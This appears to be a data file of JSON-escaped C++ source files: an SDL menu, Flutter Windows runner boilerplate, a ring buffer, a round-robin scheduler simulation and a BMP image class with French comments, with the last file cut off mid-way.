    "#include \"menu.h\"\r\n#include \"setup.h\"\r\nusing namespace std;\r\n\r\nint show_menu(SDL_Surface * screen)\r\n{ \r\n    int u=1;\r\n    SDL_Rect Back_scr = {0,0,840,600};\r\n    // nut Play\r\n    SDL_Rect Playbutton_dest = {360,240,120,60};\r\n    SDL_Rect Playbutton_scr = {0,0,120,60};\r\n    SDL_Rect Playbutton_bright_scr = {0,60,120,60};\r\n    // nut Quit\r\n    SDL_Rect Exitbutton_dest = {360,300,120,60};\r\n    SDL_Rect Exitbutton_scr = {240,0,120,60};\r\n    SDL_Rect Exitbutton_bright_scr = {240,60,120,60};\r\n\r\n    SDL_Texture* back_Tex = IMG_LoadTexture(renderer, \"img/dinosaurs-5687815_1280.jpg\");\r\n    SDL_RenderCopy(renderer, back_Tex,&Back_scr,NULL);\r\n\r\n    SDL_Texture* button = IMG_LoadTexture(renderer, \"img/Button.png\");\r\n    SDL_Texture* help =IMG_LoadTexture(renderer, \"img/help.png\");\r\n    SDL_Rect Help={790, 0, 50, 50};\r\n    SDL_Texture* help2= IMG_LoadTexture(renderer, \"img/help2.png\");\r\n    SDL_Rect Help2={0, 0, 840, 600};\r\n    SDL_Texture* back = IMG_LoadTexture(renderer, \"img/back.png\");\r\n    SDL_Rect Back={0,0, 100, 100};\r\n    SDL_RenderCopy(renderer, button,&Playbutton_scr,&Playbutton_dest);\r\n    SDL_RenderCopy(renderer, button,&Exitbutton_scr,&Exitbutton_dest);\r\n    SDL_RenderCopy(renderer, help, NULL, &Help);\r\n    bool selected[2] = {0,0};\r\n    int x, y;\r\n    SDL_Rect Pos_menu[2];\r\n    Pos_menu[0] = Playbutton_dest;\r\n    Pos_menu[1] = Exitbutton_dest;\r\n    SDL_Event event;\r\n    while (1)\r\n    {\r\n        while(SDL_PollEvent(&event))\r\n        {\r\n            if(event.type == SDL_QUIT)\r\n            {\r\n                return 1;\r\n            }\r\n            if (event.type == SDL_MOUSEMOTION && u==1)\r\n            {\r\n                x = event.motion.x;\r\n                y = event.motion.y;\r\n                if(check_click(Pos_menu[0],x,y))\r\n                {\r\n                    if(!selected[0])\r\n                    {\r\n                        selected[0] = 1;\r\n                        SDL_RenderCopy(renderer,button,&Playbutton_bright_scr,&Playbutton_dest);\r\n                    }\r\n                }\r\n                else\r\n                {\r\n                    if(selected[0])\r\n                    {\r\n                        selected[0] = 0;\r\n                        SDL_RenderCopy(renderer,button,&Playbutton_scr,&Playbutton_dest);\r\n                    }\r\n                }\r\n                if(check_click(Pos_menu[1],x,y))\r\n                {\r\n                    if(!selected[1])\r\n                    {\r\n                        selected[1] = 1;\r\n                        SDL_RenderCopy(renderer,button,&Exitbutton_bright_scr,&Exitbutton_dest);\r\n                    }\r\n                }\r\n                else\r\n                {\r\n                    if(selected[1])\r\n                    {\r\n                        selected[1] = 0;\r\n                        SDL_RenderCopy(renderer,button,&Exitbutton_scr,&Exitbutton_dest);\r\n                    }\r\n                }\r\n                \r\n            }\r\n            if (event.type == SDL_MOUSEBUTTONDOWN)\r\n                        {\r\n                            if(event.button.x >= 790 && event.button.y <=50  )\r\n                            {  u=2;\r\n                                 SDL_RenderClear(renderer);\r\n                                SDL_RenderCopy(renderer, help2, NULL, &Help2); \r\n                                SDL_RenderCopy(renderer, back, NULL, &Back);  } \r\n                                if(event.button.x <=100 && event.button.y <=100&& u==2) {\r\n                                 SDL_RenderClear(renderer); \r\n                                 u=1;\r\n                                 SDL_RenderCopy(renderer, back_Tex,&Back_scr,NULL);\r\n                                 SDL_RenderCopy(renderer, button,&Playbutton_scr,&Playbutton_dest);\r\n                                 SDL_RenderCopy(renderer, button,&Exitbutton_scr,&Exitbutton_dest);\r\n                                 SDL_RenderCopy(renderer, help, NULL, &Help);\r\n    }\r\n\r\n                            \r\n                        }\r\n            x = event.button.x;\r\n            y = event.button.y;\r\n            for (int i = 0; i <= 2; i++)\r\n            {\r\n                if (check_click(Pos_menu[i],x,y) && u==1)\r\n                    if(event.type == SDL_MOUSEBUTTONDOWN)\r\n                        return i;\r\n            }\r\n           \r\n\r\n        }\r\n        SDL_RenderPresent(renderer);\r\n    }\r\n    return 1;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <iterator>\n#include <vector>\n#include <algorithm>\n\ntemplate<typename T>\nclass RingBuffer {\nprivate:\n    T* buffer;\n    int capacity, head, tail, size;\n\n    int index(int idx) const {\n        int adjusted_idx = head + idx;\n        if (adjusted_idx >= capacity) adjusted_idx -= capacity;\n        return adjusted_idx;\n    }\n\npublic:\n    class iterator {\n        friend class RingBuffer;\n    private:\n        RingBuffer* buf;\n        int index;\n\n    public:\n        iterator(RingBuffer* buf, int index) : buf(buf), index(index) {}\n\n        T& operator*() const {\n            return buf -> buffer[buf -> index(index)];\n        }\n\n        iterator& operator++() {\n            index++;\n            return *this;\n        }\n\n        iterator operator++(int) {\n            iterator tmp = *this;\n            ++(*this);\n            return tmp;\n        }\n\n        bool operator==(const iterator& other) const {\n            return index == other.index && buf == other.buf;\n        }\n\n        bool operator!=(const iterator& other) const {\n            return !(*this == other);\n        }\n    };\n\n    RingBuffer(int cap) : capacity(cap), head(0), tail(0), size(0) {\n        buffer = new T[capacity];\n    }\n\n    ~RingBuffer() {\n        delete[] buffer;\n    }\n\n    void push_back(const T& value) {\n        if (size == capacity)\n            reallocate(capacity * 2);\n        buffer[tail] = value;\n        tail = (tail + 1) % capacity;\n        if (size < capacity) size++;\n    }\n\n    void push_front(const T& value) {\n        if (size == capacity)\n            reallocate(capacity * 2);\n        head = (head - 1 + capacity) % capacity;\n        buffer[head] = value;\n        if (size < capacity) size++;\n    }\n\n    // \u041f\u0435\u0440\u0435\u0430\u043b\u043b\u043e\u043a\u0430\u0446\u0438\u044f \u0441 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435\u043c \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u044b \u043a\u043e\u043b\u044c\u0446\u0435\u0432\u043e\u0433\u043e \u0431\u0443\u0444\u0435\u0440\u0430\n    void reallocate(int new_capacity) {\n        T* new_buffer = new T[new_capacity];\n        for (int i = 0; i < size; ++i) {\n            new_buffer[i] = (*this)[i];\n        }\n        delete[] buffer;\n        buffer = new_buffer;\n        capacity = new_capacity;\n        head = 0;\n        tail = size % capacity;\n    }\n\n    T& operator[](int idx) {\n        return buffer[index(idx)];\n    }\n\n    const T& operator[](int idx) const {\n        return buffer[index(idx)];\n    }\n\n    iterator begin() {\n        return iterator(this, 0);\n    }\n\n    iterator end() {\n        return iterator(this, size);\n    }\n\n    int getSize() const {\n        return size;\n    }\n\n};\n\nint main() {\n    RingBuffer<int> buf(5);\n    std::vector<int> v;\n\n    for(int i = 0; i < 6; ++i) {\n        buf.push_front(i);\n        v.push_back(i);\n    }\n    std::for_each(buf.begin(), buf.end(), [](int& value) {std::cout << value << ' ';});\n    std::cout <<\"\\n\";\n    std::for_each(v.begin(), v.end(), [](int& value) {std::cout << value << ' ';});\n\n    std::cout << std::endl;\n    if(std::find(buf.begin(), buf.end(), 1) != buf.end()) {\n        std::cout << \"YES\";\n    } else {\n        std::cout << \"NO\";\n    }\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\nvoid queueUpdation(int queue[],int timer,int arrival[],int n, int maxProccessIndex) {\n\tint zeroIndex;\n\tfor(int i = 0; i < n; i++) {\n\t\tif(queue[i] == 0) {\n\t\t\tzeroIndex = i;\n\t\t\tbreak;\n\t\t}\n\t} \n\tqueue[zeroIndex] = maxProccessIndex + 1;\n}\n\nvoid queueMaintainence(int queue[], int n) {\n\tfor(int i = 0; (i < n-1) && (queue[i+1] != 0) ; i++){\n\t\tint temp = queue[i];\n\t\tqueue[i] = queue[i+1];\n\t\tqueue[i+1] = temp; \n\t}\n}\n\nvoid checkNewArrival(int timer, int arrival[], int n, int maxProccessIndex,int queue[]) {\n\tif(timer <= arrival[n-1]) {\n\tbool newArrival = false;\n\tfor(int j = (maxProccessIndex+1); j < n; j++) {\n\t\t\tif(arrival[j] <= timer){\n\t\t\tif(maxProccessIndex < j){\n\t\t\t\tmaxProccessIndex = j;\n\t\t\t\tnewArrival = true;\n\t\t\t}\n\t\t}\n\t}\n\t//adds the incoming process to the ready queue\n\t//(if any arrives)\n\tif(newArrival)\n\t\tqueueUpdation(queue,timer,arrival,n, maxProccessIndex);\n\t}\n}\n\n//Driver Code\nint main(){\n\tint n,tq, timer = 0, maxProccessIndex = 0;\n\tfloat avgWait = 0, avgTT = 0;\n\tcout << \"Enter the time slice/quantum: \";\n\tcin>>tq;\n\tcout << \"Enter the number of processes: \";\n\tcin>>n;\n\tint arrival[n], burst[n], wait[n], turn[n], queue[n], temp_burst[n];\n\tbool complete[n];\n\n\tcout << \"Enter the arrival time of the processes: \";\n\tfor(int i = 0; i < n; i++)\n\t\tcin>>arrival[i];\n\n\tcout << \"Enter the burst time of the processes: \";\n\tfor(int i = 0; i < n; i++){\n\t\tcin>>burst[i];\n\t\ttemp_burst[i] = burst[i];\n\t}\n\n\tfor(int i = 0; i < n; i++) { //Initializing the queue and complete array\n\t\tcomplete[i] = false;\n\t\tqueue[i] = 0;\n\t}\n\twhile(timer < arrival[0]) //Incrementing Timer until the first process arrives\n\t\ttimer++; \n\tqueue[0] = 1;\n\t\n\twhile(true) {\n\t\tbool flag = true;\n\t\tfor(int i = 0; i < n; i++) {\n\t\t\tif(temp_burst[i] != 0) {\n\t\t\t\tflag = false;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif(flag)\n\t\t\tbreak;\n\n\t\tfor(int i = 0; (i < n) && (queue[i] != 0); i++) {\n\t\t\tint ctr = 0;\n\t\t\twhile((ctr < tq) && (temp_burst[queue[0]-1] > 0)) {\n\t\t\t\ttemp_burst[queue[0]-1] -= 1;\n\t\t\t\ttimer += 1;\n\t\t\t\tctr++;\n\n\t\t\t\t//Checking and Updating the ready queue until all the processes arrive\n\t\t\t\tcheckNewArrival(timer, arrival, n, maxProccessIndex, queue);\n\t\t\t}\n\n\t\t\t//If a process is completed then store its exit time\n\t\t\t//and mark it as completed\n\n\t\t\tif((temp_burst[queue[0]-1] == 0) && (complete[queue[0]-1] == false)) {\n\t\t\t\t//turn array currently stores the completion time\n\t\t\t\tturn[queue[0]-1] = timer;\t \n\t\t\t\tcomplete[queue[0]-1] = true;\n\t\t\t}\n\t\t\t\n\t\t\t//checks whether or not CPU is idle\n\t\t\tbool idle = true;\n\t\t\tif(queue[n-1] == 0) {\n\t\t\t\tfor(int i = 0; i < n && queue[i] != 0; i++) {\n\t\t\t\t\tif(complete[queue[i]-1] == false) {\n\t\t\t\t\t\tidle = false;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t\tidle = false;\n\n\t\t\tif(idle) {\n\t\t\t\ttimer++;\n\t\t\t\tcheckNewArrival(timer, arrival, n, maxProccessIndex, queue);\n\t\t\t}\n\t\n\t\t\t//Maintaining the entries of processes \n\t\t\t//after each premption in the ready Queue\n\t\t\tqueueMaintainence(queue,n);\n\t\t}\n\t}\n\n\tfor(int i = 0; i < n; i++){\n\t\tturn[i] = turn[i] - arrival[i];\n\t\twait[i] = turn[i] - burst[i];\n\t}\n\n\tcout << \"\\nProgram No.\\tArrival Time\\tBurst Time\\tWait Time\\tTurnAround Time\" << endl;\n\tfor(int i = 0; i < n; i++){\n\t\tcout<<i+1 << \"\\t\\t\" << arrival[i] << \"\\t\\t\" << burst[i] << \"\\t\\t\" << wait[i] << \"\\t\\t\" << turn[i] << endl;\n\t}\n\tfor(int i =0; i< n; i++){\n\t\tavgWait += wait[i];\n\t\tavgTT += turn[i]; \n\t}\n\tcout<<\"\\nAverage wait time: \" << (avgWait/n)\n\t<<\"\\nAverage Turn Around Time: \" << (avgTT/n);\n\n\treturn 0;\n\t\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <cmath>\n#include <vector>\n\n#include \"ImageNdg.h\"\n#include \"ImageDouble.h\"\n\nconst double PI = 3.14159265358979323846;\n// constructeurs et destructeur\nCImageNdg::CImageNdg() {\n\n\tthis->m_iHauteur  = 0;\n\tthis->m_iLargeur  = 0;\n\tthis->m_bBinaire  = false;\n\tthis->m_sNom      = \"vide\";\n\t\n\tthis->m_pucPixel  = NULL;\n\tthis->m_pucPalette = NULL; \n}\n\nCImageNdg::CImageNdg(int hauteur, int largeur, int valeur) {\n\n\tthis->m_iHauteur = hauteur;\n\tthis->m_iLargeur = largeur;\n\tthis->m_bBinaire\t= false; // Image Ndg par d\u00e9faut, binaire apr\u00e8s seuillage\n\tthis->m_sNom      = \"inconnu\";\n\n\tthis->m_pucPixel = new unsigned char[hauteur*largeur];\n\tthis->m_pucPalette = new unsigned char[256*4];\t\n\tchoixPalette(\"grise\"); // palette grise par d\u00e9faut, choix utilisateur \n\tif (valeur != -1) \n\t\tfor (int i=0;i<this->lireNbPixels();i++)\n\t\t\tthis->m_pucPixel[i] = valeur;\n}\n\nCImageNdg::CImageNdg(const std::string name) {\n\n\tBITMAPFILEHEADER header;\n\tBITMAPINFOHEADER infoHeader;\n\t\n\tstd::ifstream f(name.c_str(),std::ios::in | std::ios::binary); \n\t\tif (f.is_open()) {\n\t\t\tf.read((char*)&header.bfType,2);\n\t\t\tf.read((char*)&header.bfSize, 4);\n\t\t\tf.read((char*)&header.bfReserved1, 2);\n\t\t\tf.read((char*)&header.bfReserved2, 2);\n\t\t\tf.read((char*)&header.bfOffBits, 4);\n\t\t\tif (header.bfType != MAGIC_NUMBER_BMP) \n\t\t\t\tthrow std::string(\"ouverture format BMP impossible ...\"); \n\t\t\telse {\n\t\t\t\tf.read((char*)&infoHeader.biSize, 4);\n\t\t\t\tf.read((char*)&infoHeader.biWidth, 4);\n\t\t\t\tf.read((char*)&infoHeader.biHeight, 4);\n\t\t\t\tf.read((char*)&infoHeader.biPlanes, 2);\n\t\t\t\tf.read((char*)&infoHeader.biBitCount, 2);\n\t\t\t\tf.read((char*)&infoHeader.biCompression, 4);\n\t\t\t\tf.read((char*)&infoHeader.biSizeImage, 4);\n\t\t\t\tf.read((char*)&infoHeader.biXPelsPerMeter, 4);\n\t\t\t\tf.read((char*)&infoHeader.biYPelsPerMeter, 4);\n\t\t\t\tf.read((char*)&infoHeader.biClrUsed, 4);\n\t\t\t\tf.read((char*)&infoHeader.biClrImportant, 4);\n\t\t\t\tif (infoHeader.biCompression > 0) \n\t\t\t\t\tthrow std::string(\"Format compresse non supporte...\");\n\t\t\t\telse {\n\t\t\t\t\tif (infoHeader.biBitCount == 8) {\n\t\t\t\t\t\tthis->m_iHauteur = infoHeader.biHeight;\n\t\t\t\t\t\tthis->m_iLargeur = infoHeader.biWidth;\n\t\t\t\t\t\tthis->m_bBinaire = false;\n\t\t\t\t\t\tthis->m_sNom.assign(name.begin(),name.end()-4);\n\t\t\t\t\t\tthis->m_pucPalette = new unsigned char[256*4];\t\n\t\t\t\t\t\tthis->m_pucPixel = new unsigned char[infoHeader.biHeight * infoHeader.biWidth];\n\n\t\t\t\t\t\t// g\u00e9rer multiple de 32 bits via z\u00e9ros \u00e9ventuels ignor\u00e9s\n\t\t\t\t\t\tint complement = (((this->m_iLargeur-1)/4) + 1)*4 - this->m_iLargeur;\n\t\t\t\t\t\tfor (int indice=0;indice<4*256;indice++) \n\t\t\t\t\t\t\tf.read((char*)&this->m_pucPalette[indice],sizeof(char));\n\n\t\t\t\t\t\tfor (int i= this->m_iHauteur-1; i >= 0; i--) {\n\t\t\t\t\t\t\tfor (int j=0; j<this->m_iLargeur; j++) \n\t\t\t\t\t\t\t\tf.read((char*)&this->m_pucPixel[i*this->m_iLargeur+j],sizeof(char));\n\n\t\t\t\t\t\t\tchar inutile;\n\t\t\t\t\t\t\tfor (int k=0; k< complement; k++)\n\t\t\t\t\t\t\t\tf.read((char*)&inutile,sizeof(char));\n\t\t\t\t\t\t}\n\t\t\t\t\t}\t\n\t\t\t\t\telse {\n\t\t\t\t\t\t// cas d'une image couleur\n\t\t\t\t\t\tthis->m_iHauteur = infoHeader.biHeight;\n\t\t\t\t\t\tthis->m_iLargeur = infoHeader.biWidth;\n\t\t\t\t\t\tthis->m_bBinaire = false;\n\t\t\t\t\t\tthis->m_sNom.assign(name.begin(),name.end()-4);\n\t\t\t\t\t\tthis->m_pucPalette = new unsigned char[256*4];\t\n\t\t\t\t\t\tthis->choixPalette(\"grise\"); // palette grise par d\u00e9faut\n\t\t\t\t\t\tthis->m_pucPixel = new unsigned char[infoHeader.biHeight * infoHeader.biWidth];\n\n\t\t\t\t\t\t// extraction plan luminance\n\t\t\t\t\t\tint complement = (((this->m_iLargeur*3-1)/4) + 1)*4 - this->m_iLargeur*3;\n\t\t\t\t\t\tfor (int i= this->m_iHauteur-1; i >= 0; i--) {\n\t\t\t\t\t\t\tfor (int j=0;j<this->m_iLargeur*3;j+=3) {\n\t\t\t\t\t\t\t\tunsigned char rouge,vert,bleu;\n\t\t\t\t\t\t\t\tf.read((char*)&rouge,sizeof(char));\n\t\t\t\t\t\t\t\tf.read((char*)&vert,sizeof(char)); \n\t\t\t\t\t\t\t\tf.read((char*)&bleu,sizeof(char));\n\t\t\t\t\t\t\t\tthis->m_pucPixel[i*this->m_iLargeur+j/3]=(unsigned char)(((int)rouge+(int)vert+(int)bleu)/3);\n\t\t\t\t\t\t\t}\t\n\n\t\t\t\t\t\t\tchar inutile;\n\t\t\t\t\t\t\tfor (int k=0; k< complement; k++)\n\t\t\t\t\t\t\t\tf.read((char*)&inutile,sizeof(char));\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tf.close();\n\t\t}\n\t\telse\n\t\t\tthrow std::string(\"ERREUR : Image absente (ou pas ici en tout cas) !\");\n}\n\nCImageNdg::CImageNdg(const CImageNdg& im) {\n\n\tthis->m_iHauteur = im.lireHauteur();\n\tthis->m_iLargeur = im.lireLargeur();\n\tthis->m_bBinaire = im.lireBinaire(); \n\tthis->m_sNom     = im.lireNom();\n\tthis->m_pucPixel = NULL; \n\tthis->m_pucPalette = NULL;\n\n\tif (im.m_pucPalette != NULL) {\n\t\tthis->m_pucPalette = new unsigned char[256*4];\n\t\tmemcpy(this->m_pucPalette,im.m_pucPalette,4*256);\n\t}\n\tif (im.m_pucPixel != NULL) {\n\t\tthis->m_pucPixel = new unsigned char[im.lireHauteur() * im.lireLargeur()];\n\t\tmemcpy(this->m_pucPixel,im.m_pucPixel,im.lireNbPixels());\n\t}\n}\n\nCImageNdg::~CImageNdg() {\n\tif (this->m_pucPixel) {\n\t\tdelete[] this->m_pucPixel;\n\t\tthis->m_pucPixel = NULL;\n\t}\n\n\tif (this->m_pucPalette) {\n\t\tdelete[] this->m_pucPalette;\n\t\tthis->m_pucPalette = NULL;\n\t}\n}\n\nvoid CImageNdg::sauvegarde(const std::string file) {\n\tBITMAPFILEHEADER header;\n\tBITMAPINFOHEADER infoHeader;\n\n\tif (this->m_p",
